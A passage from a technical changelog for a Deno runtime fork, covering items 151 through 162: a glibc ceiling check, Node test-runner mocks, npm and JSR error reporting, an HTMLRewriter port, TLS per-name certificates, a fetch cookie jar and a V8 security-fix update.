     `librusty_v8.a` (its own libc++, built by Chromium's clang) with zig's
     linker and libc stubs, which nothing upstream runs. CEF does not constrain
     the CLI (it links no laufey or CEF; `libcef.so` 150 itself needs
     `GLIBC_2.25`), and `libdenort` / the laufey hosts keep building on
     ubuntu-22.04: the desktop runtime needs WebKitGTK 4.1, which is Ubuntu
     22.04-era anyway.

     `GLIBC_CEILING` is now `2.27`. "Check binary" runs `glibc_ceiling.py`,
     which reads each binary's version references (`objdump -p`, the
     `.gnu.version_r` section the loader checks) from every library, compares
     versions numerically (2.2.5 < 2.17 < 2.27), and fails a binary that
     requires a newer `GLIBC_` version, or none at all, listing the symbols over
     the ceiling (`objdump -T`). Then it runs `deno --version`, a `deno eval`
     and `denort` (which, with no app embedded, gets as far as "Could not find
     standalone binary section") inside the sysroot (`chroot /sysroot`), so both
     are shown to load on the ceiling's own glibc. The `cli` job's rust-cache
     prefix moves to `denext-cli-v2`. `manifest.py` records the ceiling as the
     manifest's `cli.glibc` (`null` when the workflow sets none; a malformed one
     fails the job), and denext pins it and refuses an older-glibc or musl Linux
     host before it downloads the toolchain (denext `feat/glibc-probe`).

     Verified on biscuits with the same script in an `ubuntu:22.04` container
     (x86_64): a dev-profile `cargo build --locked --bin deno --bin denort` of
     this branch links against the sysroot with Ubuntu's clang 15.0.7 and LLD
     15.0.7; `glibc_ceiling.py 2.27` passes both binaries (`GLIBC_2.27` from
     `libc.so.6`) and `2.26` fails them, naming `copy_file_range` and the five
     `pkey_*` symbols; `deno --version` (`3.0.0-denext.1`, V8 15.0.245.2),
     `deno eval` and `denort` start in the chroot. The release profile and
     aarch64 are left to the workflow. Tests:
     `.github/denext-runtime/glibc_ceiling_test.py` (parsing, numeric
     comparison, the failure listing, and the script against a stand-in
     `objdump`), run by `denext_tests.yml`'s lint job, and `manifest_test.py`'s
     `test_cli_records_the_glibc_ceiling` and
     `test_a_malformed_glibc_ceiling_is_refused`.

152. **`test(node_compat)`: 23 tests that already pass are enabled**
     (`fix/node-compat2-denext3`, test config only;
     `tests/node_compat/config.jsonc`). The 2026-10-28 re-measure
     (`plans/node-compat-gaps.md` in denext) listed 280 tests that pass on a
     debug build of item 148's branch but weren't enabled. Each was run alone
     (runner parallelism 1, report mode, the CI 10 s timeout) three times on
     Linux x86_64, and once more the runner's way to read its output: 248 of
     them pass only by a whole-file `common.skip()` (230 QUIC tests on a build
     without QUIC, ESLint, FFI, FIPS, LIEF, Temporal, Windows-only and system-CA
     tests) and stay off, as do 7 that failed or timed out in at least one run
     (`test-cluster-send-deadlock`, `-gc-http-client-connaborted`,
     `-http-server-headers-timeout-keepalive`,
     `-http-server-request-timeout-keepalive`, `-http2-forget-closed-streams`,
     `-inspector-exit-worker-in-wait-for-connection`,
     `sequential/test-net-server-listen-ipv6-link-local`) and
     `test-crypto-hash.js` (a partial skip, and ignored for CI flakiness). The
     platform switches follow upstream Deno's own per-OS report
     (`dl.deno.land/node-compat-test/2026-10-2{7,8}/report-{darwin,windows}-*`,
     Node 26.5.1): where upstream passes a test on macOS or Windows it runs
     there; where upstream fails it there too (most of these pass only through
     this fork's fixes) the entry is Linux-only, with that reason, until it is
     checked on those systems.
     - Everywhere: `internet/test-https-autoselectfamily-slow-timeout.js` (was
       off on Linux), `parallel/test-webcrypto-digest-turboshake-rfc.js`,
       `-worker-http2-stream-terminate.js`, `-worker-terminate-source-map.js`.
     - Linux and macOS:
       `parallel/test-child-process-fork-closed-channel-segfault.js` (was off on
       Linux).
     - Linux and Windows: `parallel/test-child-process-pipe-dataflow.js`,
       `-socket-writes-before-passed-to-tls-socket.js`,
       `sequential/test-cluster-net-listen-ipv6only-rr.js` (were off on Linux).
     - Linux x86_64 only: `parallel/test-v8-serialize-leak.js` (was ignored; the
       leak check fails on macOS, Windows and Linux aarch64).
     - Linux only: `es-module/test-require-module-preload.js`,
       `module-hooks/test-async-loader-hooks-initialize-throw-null.mjs`,
       `-throw-symbol.mjs`,
       `parallel/test-process-threadCpuUsage-worker-threads.js` (were ignored),
       `es-module/test-esm-loader-mock.mjs`, `-thenable.mjs`,
       `-with-syntax-error.mjs`, `test-esm-virtual-json.mjs`,
       `parallel/test-http-no-read-no-dump.js`, `-http-server-keepalive-end.js`,
       `-https-expect-continue-reuse-race.js`, `-net-listen-ipv6only.js`,
       `-preload-print-process-argv.js`,
       `sequential/test-cluster-net-listen-ipv6only-none.js`.
     - Left out again at integration: `parallel/test-gc-net-timeout.js` passes
       on biscuits but waits on the GC and fails on the hosted Linux runner, as
       when it was first left out (3.0.0-denext.3's first CI run).

153. **`fix(ext/node)`: `node:test` mocks as Node's `MockTracker`, mock timers
     for `scheduler.wait` and the `node:timers` exports, `assert.register()` and
     the context's `filePath` / `passed` / `attempt`**
     (`fix/node-compat2-denext3`, runtime; `ext/node/polyfills/testing.ts`,
     `testing_esm.ts`, `timers.ts`). The `node:test` runner is the largest open
     cluster of the 2026-10-28 re-measure (146 failing tests); this takes its
     API-fidelity part, against Node 26.5.1's
     `lib/internal/test_runner/mock/mock.js`, `mock_timers.js`, `assert.js`,
     `test.js` and `lib/test.js`.
     - **Mocks.** `mock.fn()` / `mock.method()` return a `Proxy` of the
       original, as Node's do: the mock has the original's `name`, `length` and
       `prototype`, and `new mock()` constructs with `new.target` the mock (so a
       mocked constructor's instance is an instance of the original class even
       with another implementation), records `target` and, for a constructor
       that throws, `this: undefined`. A method spy found on a prototype is
       defined on the object itself and its restore leaves that own descriptor
       (Node's). Arguments are checked as Node checks them:
       `ERR_INVALID_ARG_TYPE` for a non-object target or a method name that
       isn't a string or symbol, `ERR_INVALID_ARG_VALUE` for a missing method
       ("must be a method"), `getter` with `setter`, `getter: false` /
       `setter: false` on the sugar, and a `times` that isn't an integer >= 1;
       `mockImplementationOnce(fn, onCall)` refuses a call already made.
       `fn.mock.restore()` makes a function mock call its original again (it can
       be re-mocked), and `times` restores after the last mocked call.
     - **Trackers.** Each `t.mock` and the module's `mock` are their own
       `MockTracker`: `reset()` restores the mocks _that_ tracker created and
       forgets them, keeping their recorded calls (it cleared every mock's call
       history, and restored nothing for `mock.fn()`), and `restoreAll()`
       restores them; `fn.mock.resetCalls()` only clears calls (it also restored
       the mock). A test's `t.mock` is reset after its parent's `afterEach()`
       hooks, which still see the subtest's mocks (it was reset before them).
     - **Mock timers.** `scheduler.wait` is a mockable API
       (`enable({ apis: ["scheduler.wait"] })`): `timers/promises`'s
       `scheduler.wait` runs on the virtual clock, and its abort clears the mock
       timer. While enabled, the mocked functions are also the
       `require("node:timers")` / `node:timers/promises` exports (their own
       property descriptors are back after `reset()`), as Node's MockTimers
       replaces them; bindings captured earlier keep going through the installed
       instance. A mock timer has `close()` and `[Symbol.dispose]()`, and the
       mocked globals take a missing callback as Node's do.
     - **`t.assert`.** `require("node:test").assert.register(name, fn)` adds or
       overrides an assertion; each context's `t.assert` holds every registered
       one, called with the context as `this` and counted against `t.plan()`,
       plus `ok` (reporting from the caller's frame) and `fileSnapshot`.
       `t.assert.x` is no longer `assert.x` itself.
     - **Context.** `filePath` (the test file being run, also for tests a module
       it imports declares), `passed` and `attempt` (always 0; there is no
       `--test-rerun-failures`) on test and suite contexts.

     Left open (in the gaps file): an unawaited `t.test()` is still "INCOMPLETE"
     rather than awaited by its parent, which keeps
     `test-runner-test-fullname.js`, `-test-filepath.js` and
     `-mock-timers-date.js` failing (draining it, tried here, turns a subtest
     held only by an unref'd timer into "the event loop has already resolved"
     for the whole parent); `t.assert.snapshot` and the removed
     `assert.CallTracker` (Node 25) keep `test-runner-assert.js` failing.

     Tests: node_compat `parallel/test-runner-mocking.js`, `-mock-timers.js`,
     `-mock-timers-scheduler.js` and `-custom-assertions.js` enabled (each
     passed three isolated runs). Specs: `node/node_test_mock` (`mock.reset()`
     keeps calls and restores `mock.fn()`; the non-method error is Node's) and
     `node/node_test_module` (`t.assert` methods are wrappers that work, not
     `node:assert`'s own).

154. **`fix(pm)`: `deno add` / `deno install <pkg>` say "was not found" only for
     a 404** (`fix/npm-lows-denext3`, CLI only; `cli/tools/pm/mod.rs`,
     `cli/npm.rs`, `cli/jsr.rs`). The registry lookup behind `deno add`,
     `deno install npm:x` / `jsr:x` read a package's metadata with
     `package_info`, which turned every failure into "no metadata", and
     `find_package_and_select_version_for_req` reported that as
     `npm:x was not found.` A connection failure, a 5xx or a download that hit
     its deadlines (item 149) all read as a missing package, and the per-attempt
     deadline report was never shown; a stalled JSR registry even read
     `jsr:@denotest/add was not found, but a matching npm package exists`.
     `PackageInfoLoadError` now keeps the failure itself (causes included) and
     whether the registry answered 404 (the fetch error's class is `NotFound`,
     which for a registry URL means a 404). When no version was selected and the
     metadata failed for any other reason, the command fails with
     `Failed loading package information for npm:x from <registry>` and the
     chain under it (the `Import '…' failed.` line, then the deadline report or
     `500 Internal Server Error`). A 404, and a version the package doesn't
     have, keep the "was not found" message and its npm / JSR hints, as npm
     keeps `E404` for a package the registry doesn't have and reports
     `ETIMEDOUT` / `ECONNREFUSED` / `E500` as such. The `Reason:` line that
     `deno outdated` prints at debug level now carries the chain too.

     Tests: the `add::registry_lookup_failures` spec (1 s deadlines, 2
     attempts): an npm registry that never answers (`deno add` and
     `deno install`), an npm registry that answers 500 (a new
     `/download_deadlines/server_error/` test-server route), a JSR registry that
     never answers, each showing the real error; an npm and a JSR package that
     don't exist, still `was not found.` Before the fix the four failure cases
     printed `… was not found.`

155. **`fix(npm)`: a `:` in a bin name separates segments, as in npm**
     (`fix/npm-lows-denext3`, CLI only; `libs/npm_installer/bin_entries.rs`).
     npm links a `bin` key under the basename it gets after replacing `\` and
     `:` with `/` (`npm-normalize-package-bin`, which `bin-links` runs before
     linking), so `a:b` links as `b`, `C:tool` as `tool`, `tool:` as `tool`, and
     `:` or `a:..` is dropped. `normalize_bin_name` (item 97) split only at `/`
     and `\`, so `a:b` was linked as `node_modules/.bin/a:b`: on Windows a `:`
     in a file name names an NTFS alternate data stream (the stream `b` of a
     file `a`), and a drive-relative key such as `C:tool` replaced the whole
     path when joined to `.bin`. `:` is now a separator too. (The earlier note
     that "npm strips `:`" was close: npm splits at it and keeps the last
     segment.) `deno install -g` is unaffected: it refuses any executable name
     outside `[a-z0-9][\w-]*`.

     Test: `bin_names_split_at_colons_like_npm`
     (`libs/npm_installer/bin_entries.rs`); it fails before the fix
     (`left: Some("tool:sub")`).

156. **`fix(graph)`: a JSR manifest that fails to load shows why**
     (`fix/npm-lows-denext3`, CLI only; `libs/resolver/graph.rs`). deno_graph's
     `JsrLoadError::PackageManifestLoad` (and `PackageVersionManifestLoad`)
     prints its load error into the message with `{:#}` but doesn't return it
     from `source()`, so `format_deno_graph_error`'s cause chain stopped at the
     manifest line (`JSR package manifest for '…' failed to load.` followed by
     `Import '…/meta.json' failed.`), and the deadline report (item 149) under
     that import was lost. `enhance_graph_error` now matches those two variants
     and lists the load error's own causes under the message (the same numbered
     format, a cause that repeats the line before it skipped), so deno_graph (an
     external crate) needs no patch. Test: `cache::download_deadlines`'s
     `jsr_never_answers` now expects the per-attempt report under the manifest
     line; before the fix it ended at `failed.`

157. **`fix(test)`: Vitest tests follow `deno test`'s sanitizer settings**
     (`fix/vitest-sanitizers-denext3`, CLI only;
     `cli/tools/test/vitest/js/runtime.js`, `cli/js/40_test.js`,
     `tools/vendor_vitest.ts` and the vendored `runner.js` / `vitest_core.js`).
     The Vitest layer (item 23) registered every Vitest and Jest test with
     `Deno.test({ sanitizeOps: false, sanitizeResources: false
     })`. A
     test's own options outrank everything else (`Deno.test.sanitizer()`, the
     flags, the `DENO_TEST_SANITIZE_*` variables, deno.json's `test` options),
     so no Vitest test was ever checked for leaks: a project that turned the
     sanitizers on (denext, for its own suite) found its Vitest tests exempt.
     The options came with the bridge itself, unexplained; turning them back on
     showed what they hid besides real leaks. Deno checks what starts and
     finishes while a test's Deno test function runs, and the bridge's function
     for a Vitest test waits until Vitest's runner stops at the next test, so a
     test's span also holds the `afterAll` hooks of the suites it ends and the
     `beforeAll` hooks of the suites the next test starts: a server a `describe`
     opens in `beforeAll` and closes in `afterAll` was a leak of the test before
     the suite and a "closed during the test" of its last test. File- and
     worker-scoped fixtures (set up by the first test that asks, torn down after
     the last) did the same, and so did Vitest's own timers: the runner's
     throttled task-update timer (pending for up to 100 ms after a task update)
     landed on whichever test was running, and the fake clock's real
     auto-advance interval (`shouldAdvanceTime`) lives as long as the clock,
     which Vitest keeps installed across tests until `vi.useRealTimers()`;
     neither Vitest nor `@sinonjs/fake-timers` resets it per test.

     The options are gone, so the normal precedence applies, except for tests
     whose span cannot be the test's alone (`sanitizerExemptTests`, computed
     from the collected tree after `--filter` is applied, since which tests run
     decides the spans): the test whose span starts a suite with `beforeAll` /
     `aroundAll` hooks (the file's first test when they run before any test, as
     Vitest's runner starts them while Deno loads the module), a suite's last
     test when it has `afterAll` / `aroundAll` hooks, a test that can set up a
     file- or worker-scoped fixture (its function asks for one, directly or
     through another fixture, or one is `auto`; every test of such a
     `test.extend` under per-test hooks, which can ask for one too), and the
     file's last test when any can. Those register with both sanitizers off, and
     their leaks are not blamed on later tests (`record_ignored_leaks`). The
     runner's throttle timer and the fake clock's own timers (the auto-advance
     interval, also for tick mode `"interval"`, and the `"nextTimerAsync"`
     loop's timer) become system timers, which the sanitizers ignore like
     `AbortSignal.timeout`'s: a new `Deno[Deno.internal].vitestSystemTimers`
     (`core.createSystemTimer` / `createSystemInterval` / `cancelTimer`, refed
     like the timers they replace) and five marked patches in
     `tools/vendor_vitest.ts`. Two more patches let the bridge see fixtures:
     `getTestFixtures` is exported, and a test's requested fixtures (Vitest's
     `getUsedProps`) are recorded when it is collected (a malformed
     destructuring still fails when the test runs). Fake timers queued and never
     run were never real timers and are not leaks; `.concurrent` tests need
     nothing, as the bridge runs one at a time. Vitest has no per-test leak
     check of its own (`teardownTimeout` and the `hanging-process` reporter are
     about the whole process), so this is Deno's check on Vitest's semantics,
     not a port of a Vitest feature.

     Tests: `tests/specs/test/vitest_sanitizers` (a timer leaked by one Vitest
     test fails it, and only it, with the sanitizers enabled by deno.json, by
     the flags and by `DENO_TEST_SANITIZE_OPS`, and passes with them disabled;
     queued fake timers, `advanceTimersByTimeAsync`, both auto-tick modes and a
     `shouldAdvanceTime` clock left installed across three tests pass with them
     enabled; suite hooks and a file-scoped fixture holding listeners pass,
     while a leak in a test between them still fails). Before the fix the
     enabled runs passed every test; with the options removed alone, the fake
     clock and the hooks were reported as leaks.

158. **`feat(ext/html_rewriter)`: `HTMLRewriter`, behind
     `--unstable-html-rewriter`** (`feat/html-rewriter`, CLI and runtime;
     `ext/html_rewriter`, `runtime/js/98_global_scope_shared.js`,
     `runtime/features/data.rs`,
     `runtime/{shared,snapshot,snapshot_info,worker,web_worker}.rs`,
     `libs/cli_parser`, `cli/tsc/dts/lib.deno.unstable.d.ts`,
     `cli/schemas/config-file.v1.json`). Cloudflare Workers' (and Bun's)
     streaming HTML rewriting API as a global, ported from denoland/deno#35112
     (Bartek Iwańczuk's pull request, closed unmerged when upstream stopped
     taking features; its branch is the fork's June `feat/html-rewriter`).
     Upstream's review settled the placement: a global like Workers and Bun, not
     `Deno.HTMLRewriter`.
     - **On:** `--unstable-html-rewriter` or `"unstable": ["html-rewriter"]` in
       the config file; the global is absent otherwise (main thread and
       workers).
     - **API:**
       `new HTMLRewriter().on(selector, { element, comments, text
       }).onDocument({ doctype, comments, text, end }).transform(input)`.
       `transform(response)` returns a `Response` whose body streams as the
       input arrives; `transform(string)` returns the rewritten string
       synchronously. Element tokens: `tagName` (settable), `attributes`,
       `namespaceURI`, `removed`, `getAttribute` / `hasAttribute` /
       `setAttribute` / `removeAttribute`, `before` / `after` / `prepend` /
       `append` / `replace` / `setInnerContent` with `{ html }`, `remove`,
       `removeAndKeepContent`, `onEndTag(handler)` (end tags: `name`, `before`,
       `after`, `remove`). Text chunks: `text`, `lastInTextNode`, `before` /
       `after` / `replace` / `remove`. Comments: `text` (settable), `before` /
       `after` / `replace` / `remove`. Doctype: `name`, `publicId`, `systemId`,
       `remove`. Document end: `append`. Selectors are lol_html's: type, `*`,
       `.class`, `#id`, `[attr]` with `=`, `~=`, `|=`, `^=`, `$=`, `*=`,
       descendant and child combinators, `:first-child`, `:nth-child()`,
       `:first-of-type`, `:nth-of-type()`, `:not()`; an unsupported one throws a
       `TypeError` from `on()`.
     - **Async handlers:** a handler may return a promise when the input is a
       `Response`; parsing of that transform waits for it. A string transform
       refuses one with a `TypeError`.
     - **Errors:** a handler's exception, or its promise's rejection, aborts the
       transform and reaches the caller as the same error object: thrown by a
       string transform, the body stream's error for a `Response`. A token used
       after its handler returned throws a `TypeError`.
     - **How:** a `lol_html::send::HtmlRewriter` per transform on a cppgc
       object; each `write` / `end` runs on the shared blocking pool, and a
       content handler parks that task until JavaScript has run the user handler
       (and awaited its promise) on the main thread, mutating the token through
       generation-checked sync ops meanwhile. An idle streaming transform holds
       no thread.
     - **On top of the upstream pull request:** the review's one correctness
       finding is fixed: the transformed `Response` drops the input's
       `Content-Length` and `Transfer-Encoding` (the body length changes), and
       `Content-Encoding` when `fetch` decompressed the input (the output is the
       decoded body), as Workers and Bun do. The fork's lazily computed
       `content-type` of a string body is materialized before the headers are
       copied (`toInnerResponse`). The flag is registered in the fork's own
       parser (`libs/cli_parser`) and the config schema.
     - **Dependency:** `lol_html` `=3.0.1` (Cloudflare, BSD-3-Clause; 3.0.2 is
       younger than the dependency age hold), with `selectors` 0.37,
       `servo_arc`, `precomputed-hash`, `phf_codegen` and `derive_more` 2;
       `bitflags` 2.9.3 → 2.11.1 and `cfg-if` 1.0.3 → 1.0.4 (lol_html's
       minimums).
     - **Limits:** UTF-8 input only (no `<meta charset>` sniffing); a string
       transform occupies a blocking-pool thread while it parses.

     Tests: `tests/unit/html_rewriter_test.ts` (upstream's 21, plus
     `htmlRewriterDropsStaleContentLength`, `htmlRewriterKeepsLazyContentType`,
     `htmlRewriterFetchedGzipResponse` and
     `htmlRewriterAsyncHandlerRejectionPropagates`); specs `run/html_rewriter`
     (`large_body`: ~6 MB in 2,000 pulled chunks, output readable before the
     source is drained and every element seen; `selectors`; `async_handlers`;
     `errors`; `config`; `off_by_default`) and upstream's
     `run/unstable_html_rewriter_{enabled,disabled}` (main thread and worker);
     the parser test `unstable_html_rewriter_flag`.

159. **`feat(tls)`: `resolveCertificate`, a certificate per server name for
     `Deno.listenTls` and `Deno.serve`** (`feat/platform-apis-denext3`, runtime;
     `ext/tls/tls_key.rs`, `ext/net/{02_tls.js,ops_tls.rs}`,
     `ext/http/00_serve.ts`, `cli/tsc/dts/lib.deno{.ns,_net}.d.ts`). Ported by
     hand from denoland/deno#35179 (the fork's June
     `feat/tls-clienthello-resolver`, closed unmerged upstream), keeping its
     API. It replaces the internal `Symbol.for("unstableSniResolver")` option.
     - **On:** `--unstable-net` (or `"unstable": ["net"]`); without it a
       `resolveCertificate` listener exits the process with the unstable-API
       error.
     - **API:**
       `Deno.listenTls({ port, resolveCertificate(serverName,
       clientHello) { return { cert, key }; } })`,
       and the same option on `Deno.serve` in place of `cert` / `key`.
       `serverName` is the SNI host name, `""` when the client sent none (an IP
       address, say). `clientHello` (`Deno.TlsClientHello`, frozen) carries the
       offered `alpnProtocols` and the raw IANA code points of `cipherSuites`,
       `signatureSchemes` and `supportedGroups`. The callback may return a
       promise. A throw, a rejection or a result without `cert` and `key` aborts
       that handshake; returning a default pair is how an app falls back for
       unknown names.
     - **Caching:** a successful result is cached per server name (the newest
       1024 names; the oldest resolved one is evicted beyond that), so the
       callback normally runs once per name and never twice at once for one
       name. Errors are not cached, so the next handshake retries. Different
       names resolve concurrently (the fork's own change to the resolver: a slow
       callback for one name does not hold up the others).
     - **On top of the pull request:** its one open review point is fixed. An
       in-flight resolution is never evicted from the bounded cache: evicting it
       let the next handshake for that name start a second, concurrent callback,
       and the first one's completion then overwrote or removed the second one's
       entry. In-flight entries are bounded by the handshakes in flight; the
       bound is enforced again as each one settles.
     - **denext:** multi-domain TLS for `denext start` and compiled servers
       without a proxy, and a hook for userland ACME. A stock Deno has no such
       option, so denext gates it on the runtime version (`Deno.build.denext`
       and the release that carries this item) and keeps `cert` / `key` for
       stock Deno.

     Tests: `ext/tls/tls_key.rs` (upstream's `test_resolve_cached_by_name`,
     `test_errors_are_not_cached`, `test_cache_is_bounded`, and
     `test_in_flight_resolution_is_not_evicted`), `tests/unit/tls_sni_test.ts`
     (`listenResolver`, `listenResolverDoesNotBlockUnrelatedSni`,
     `listenResolverClientHello`, `listenResolverCachedByName`,
     `serveResolver`), and the spec `run/tls_resolve_certificate`: two host
     names on one listener get different certificates (RSA and ECDSA, checked
     against the peer certificate's DER), an unknown name is refused, a client
     without SNI gets the fallback, a name is resolved once, `Deno.serve` serves
     HTTPS through it, and it requires `--unstable-net`.

160. **`feat(unstable)`: a cookie jar for `fetch`, `Deno.Cookie` and
     `Deno.CookieMap`, behind `--unstable-cookies`** (`feat/carries2-denext3`,
     runtime;
     `ext/fetch/{cookies.rs,public_suffix.rs,public_suffix_list.dat,
     27_cookies.js,22_http_client.js,lib.rs}`,
     `runtime/js/90_deno_ns.js`, `runtime/features/data.rs`, `libs/cli_parser`,
     `cli/schemas/config-file.v1.json`, `cli/tsc/dts/lib.deno.unstable.d.ts`).
     Ported from denoland/deno#35117 (Bartek Iwańczuk's pull request, closed
     unmerged; the fork's June `feat/fetch-cookie-jar`), keeping its API: a
     hand-rolled RFC 6265bis cookie model, no new crate.
     - **On:** `--unstable-cookies` or `"unstable": ["cookies"]`; the
       `Deno.Cookie*` names are absent otherwise and `new Deno.CookieJar()`
       exits with the unstable-API error.
     - **API:** `Deno.createHttpClient({ cookieJar: true | jar })` stores each
       response's `Set-Cookie` (every redirect hop included) and sends the
       matching cookies on later requests through that client; an explicit
       `Cookie` request header bypasses the jar. `client.cookieJar` returns the
       jar. `Deno.CookieJar` (`setCookie(header | init, url?)`,
       `getCookies(url?)`, `getCookieString(url)`, `deleteCookie`, `clear`,
       `toJSON()` and a constructor seed for persistence, `close` / `using`) can
       be shared between clients. `Deno.Cookie.parse` / `serialize` for
       `Set-Cookie` values, and `Deno.CookieMap`, a `Map`-like view of a
       request's `Cookie` header for `Deno.serve` and `node:http`.
     - **Storage rules:** host-only versus domain cookies, the default path and
       path matching, `Max-Age` over `Expires` with the 400-day cap, `Secure`
       only from and to `https`/`wss` or loopback, no shadowing of a secure
       cookie from an insecure connection, the `__Secure-` / `__Host-` prefixes,
       and per-domain and total limits with least-recently-used eviction.
       `HttpOnly` is kept and reported, and sent (there is no page script to
       hide it from); `SameSite` is kept and reported but not enforced on
       sending (a server-side client has no site for cookies).
     - **On top of the pull request:** a `Domain=` attribute is limited to the
       request host's registrable domain (its public suffix plus one label),
       from a pinned Public Suffix List snapshot compiled into the binary, with
       no network access. The pull request only refused a dotless `Domain`.
       `Domain=co.uk` from `www.example.co.uk`, or `Domain=github.io` from
       `foo.github.io` (the list's PRIVATE section counts, as in browsers), is
       refused; a host that is itself a public suffix may name itself and gets a
       host-only cookie (RFC 6265bis section 5.7, step 9). A jar seeded without
       a URL refuses a public-suffix domain too. Also: `SameSite=None` without
       `Secure` is refused (section 5.7, step 19), and the flag is registered in
       the fork's own parser and the config schema.
     - **The PSL snapshot:** `ext/fetch/public_suffix_list.dat`, unmodified,
       from https://github.com/publicsuffix/list commit
       `9dfbe81931367b3f0af21035c36ae7eeb830dd88` (2026-10-28), SHA-256
       `d3e6243b51695327984abb3e2a5aa7077096867f75121e031e6a5a3840ca8bcd` (MPL
       2.0, see its header). Matching follows the list's format specification
       (wildcards, exception rules, the default `*` rule; Unicode rules compared
       in their punycode form). To update it, download `public_suffix_list.dat`
       from https://publicsuffix.org/list/ (or the raw file at a GitHub commit),
       replace the file, and update the commit, date and hash here and in
       `ext/fetch/public_suffix.rs`; the `public_suffix_snapshot_is_pinned` test
       fails until the hash matches. Refresh it with each runtime release cut.
     - **denext:** `denext/testing`'s `CookieJar` and server-side `fetch`
       sessions (OAuth back-channel calls, backend proxies) can use a
       `Deno.createHttpClient({ cookieJar })` client when `Deno.build.denext`
       reports a release that carries this item and the process runs with
       `--unstable-cookies`; `Deno.CookieMap` could back `cookies()` parsing.
       denext keeps its own code for stock Deno.

     Tests: `ext/fetch/cookies.rs` (upstream's parser, date, matching, storage
     and serialization tests, plus
     `storage_domain_limited_to_registrable_domain` and
     `storage_same_site_none_requires_secure`), `ext/fetch/public_suffix.rs`
     (`registrable_domains`: ICANN, PRIVATE, wildcard, exception, default and
     Unicode rules; `public_suffixes`; `public_suffix_snapshot_is_pinned`),
     `tests/unit/cookie_test.ts` (upstream's 17, including the `fetch` round
     trip, the redirect hop and a shared jar, plus
     `cookieJarDomainLimitedToRegistrableDomain`, `cookieJarPathMatching`,
     `cookieJarAttributes` and `cookieJarExpiresAttribute`), upstream's specs
     `run/unstable_cookies_{enabled,disabled}` (main thread and worker), and the
     parser test `unstable_cookies_flag`.

161. **`feat(npm)`: `patchedDependencies`, diffs applied to npm packages on
     install** (`feat/carries2-denext3`, CLI;
     `libs/npm_installer/{patch.rs,
     local.rs,hoisted.rs,lib.rs,factory.rs}`,
     `libs/config/{deno_json,
     workspace}/mod.rs`,
     `libs/package_json/lib.rs`,
     `libs/resolver/{factory,workspace,lockfile}.rs`,
     `libs/lockfile/{lib,printer}.rs`, `cli/schemas/config-file.v1.json`).
     Ported from denoland/deno#35247 (Bartek Iwańczuk's pull request, closed
     unmerged; the fork's June `feat/patched-dependencies-clean`, five commits),
     keeping its config shape, which is pnpm's and Bun's:
     ```json
     {
       "nodeModulesDir": "auto",
       "patchedDependencies": {
         "pkg@1.2.3": "patches/pkg@1.2.3.patch",
         "@scope/pkg@^2": "patches/scope-pkg.patch",
         "other": "patches/other.patch"
       }
     }
     ```
     - **Keys:** `<name>@<version>` (exact), `<name>@<range>`, or a bare
       `<name>` (every version). The most specific matching entry applies:
       exact, then range, then name. A dist-tag key (`pkg@latest`) is a parse
       error. **Values:** a path to a unified (git-style or `diff -u`) diff,
       relative to the config file; one patch may touch several files.
     - **Where:** the workspace root `deno.json` and/or the root `package.json`
       (top-level `patchedDependencies`, as Bun and pnpm 10 read it); for the
       same key `deno.json` wins. It requires a `node_modules` directory
       (`nodeModulesDir` `auto` or `manual`, or a package.json project);
       otherwise resolution stops with an error.
     - **Applying:** the diff is applied to the project's `node_modules` copy
       after the package is cloned from the global cache (the hardlink is broken
       first, so the cache stays pristine), in both the isolated and the hoisted
       layout. A patch that fails to apply fails the install. A change to,
       addition or removal of a patch re-clones and re-applies the package (the
       isolated layout folds the patch hash into the folder's `.initialized`
       marker; the hoisted layout records it under
       `node_modules/.deno/.hoisted-patched/`).
     - **Lockfile:** `deno.lock` records each key with a 64-bit xxHash of its
       patch file under `workspace.patchedDependencies`, so an edited patch
       shows up in review and `--frozen` refuses the drift.
     - **On top of the pull request:** an entry for an installed package that
       applies to none of its installed versions (`pkg@1.0.0` while `pkg@2.0.0`
       is installed, or an entry shadowed by a more specific one) is reported
       once per run:
       `Warning "patchedDependencies" entry
       "pkg@1.0.0" was not applied: no installed version matches it
       (installed: 2.0.0).`
       (pnpm fails the install instead, unless `allowUnusedPatches`; the pull
       request's config shape has no such switch, so this is a warning.) A patch
       naming a file outside its package (`../`, an absolute path) is refused.
       The hoisted layout, which the fork made skip an already installed package
       (item 47), re-installs a package whose patch changed rather than keeping
       the stale copy.
     - **denext:** `denext patch` can write `patchedDependencies` (the shape
       above: key `<name>@<exact version>`, value the patch's path relative to
       the root `deno.json`) for npm targets when the toolchain carries this
       item (`Deno.build.denext` and the release that carries it), and keeps its
       own mechanism for denext self-patches and stock Deno.
       `denext
       migrate` can carry a pnpm or Bun project's
       `patchedDependencies` over as they are.

     Tests: `libs/config/deno_json`
     (`patched_dependencies_key_formats_and_priority`,
     `patched_dependencies_rejects_dist_tag`, `patched_dependencies_unapplied`),
     `libs/npm_installer/patch.rs` (`applies_a_git_style_patch`,
     `refuses_a_target_outside_the_package`), the lockfile crate's spec and
     integration tests, and the specs `npm/patched_dependencies` (applied on
     install), `_package_json`, `_range`, `_name_only`, `_reapply`,
     `_apply_error`, `_hoisted`, `_hoisted_reapply` (changed and removed patch,
     hoisted layout), `_other_version` (a patch for another version is reported
     and not applied) and `lockfile/patched_dependencies` (the hash in
     `deno.lock`, `--frozen` refuses a changed patch).

162. **`chore(deps)`: V8 15.2.124.45 from Brainwires/rusty_v8** (`v8` crate
     `152.2.1+denext.1`; `chore/v8-15.2.124.45-denext3`; runtime and CI;
     `Cargo.toml`, `.github/denext-runtime/fetch_rusty_v8.py`,
     `.github/denext-runtime/rusty_v8.sha256`). Item 150's `v8` 152.2.0 carries
     V8 15.2.124.1, but Google kept merging security fixes onto V8's 15.2 branch
     for Chrome 152 and Extended Stable 152 up to 15.2.124.45 (2026-10-14),
     among them the fixes for two V8 bugs exploited in the wild: CVE-2026-85046
     (a type confusion, fixed in 15.2.124.21) and CVE-2026-87491 (an
     out-of-bounds write, crbug 543557673). Upstream rusty_v8 has released
     nothing since 152.2.0 (its V8 autoroll fails every day), so the fork builds
     its own: Brainwires/rusty_v8's branch `denext/v152.2.0-v8.15.2.124.45` is
     upstream's `v152.2.0` with the `v8` submodule moved to denoland/v8
     `7d033dd9d2` (`15.2-lkgr-denoland`: 15.2.124.45 plus denoland's embedder
     patches). V8's `DEPS` pins and public headers are unchanged between the two
     (only `v8-version.h` moves), so no other submodule and no binding changes.
     The version is a patch above upstream with build metadata, so it satisfies
     `libs/deno_v8`'s `152.2.0` requirement through `[patch.crates-io]`; a
     pre-release (`152.2.0-denext.1`) would sort below `152.2.0` and not match.

     The crate comes by git rev from that repository's `crate` branch, which
